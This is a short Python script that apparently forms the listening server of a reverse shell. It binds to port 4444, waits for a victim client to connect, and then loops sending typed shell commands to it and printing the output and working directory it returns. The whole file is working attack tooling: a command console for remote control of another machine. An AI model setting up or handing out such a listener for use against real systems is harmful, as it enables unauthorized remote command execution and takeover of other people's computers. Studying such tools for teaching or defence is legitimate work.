import socket

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 1024*128 # max size of messages

SEPARATOR = "<sep>"

s = socket.socket()

# bind the socket
s.bind((SERVER_HOST, SERVER_PORT))

# Listening
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# Accept client to connect
client_socket, client_adress = s.accept()

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory", cwd);

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue

    client_socket.send(command.encode())
    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)